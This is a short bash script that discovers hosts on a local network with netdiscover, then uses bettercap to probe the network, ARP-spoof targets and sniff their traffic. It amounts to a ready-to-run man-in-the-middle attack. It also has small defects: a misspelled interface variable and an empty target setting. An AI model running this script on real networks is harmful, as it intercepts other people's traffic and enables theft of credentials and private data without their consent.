#!/bin/bash
echo 
netdiscover -i $INTERNFACE
bettercap -iface $INTERFACE -eval "net.probe on; ticker on "
bettercap -iface $INTERFACE -eval "net.probe on; set arp.spoof.targets; arp.spoof on; set net.sniff.verbose false; net.sniff on"
